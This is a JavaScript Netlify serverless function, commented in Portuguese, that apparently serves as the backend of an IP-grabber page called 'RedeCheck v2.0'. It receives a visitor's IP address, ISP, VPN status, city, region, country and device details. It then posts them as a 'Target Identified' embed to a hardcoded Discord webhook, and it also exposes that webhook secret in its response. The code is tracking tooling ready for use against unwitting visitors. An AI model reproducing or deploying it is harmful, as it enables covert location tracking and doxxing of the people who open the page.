// Função serverless que roda no Netlify
exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  // Cole sua webhook aqui
  const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1530746634646851594/MELPQ3WSCQBTKCtnEvHay1LirL6sHu4ats3XnDY3Twhx1w8Sw4JLJgPbVpzSQN_nrMaN";

  try {
    const data = JSON.parse(event.body);
    console.log('Dados recebidos:', data);

    const embed = {
      title: "🎯 Alvo Identificado",
      color: 16711680,
      fields: [
        { name: "🌐 IP", value: data.ip, inline: true },
        { name: "🏢 ISP", value: data.isp, inline: true },
        { name: "🛡️ VPN", value: data.vpn, inline: true },
        { name: "📍 Local", value: `${data.city}, ${data.region}\n${data.country}`, inline: false },
        { name: "📱 Device", value: `${data.deviceType} / ${data.os}`, inline: true }
      ],
      footer: { text: "RedeCheck v2.0 – Netlify Serverless" },
      timestamp: new Date().toISOString()
    };

    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });

    console.log("✅ Dados enviados ao Discord");

    return {
      statusCode: 200,
      body: JSON.stringify({ status: "ok", sent_to: DISCORD_WEBHOOK }),
    };
  } catch (err) {
    console.error("❌ Erro ao processar requisição:", err);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: "Internal Server Error", detail: err.message }),
    };
  }
};
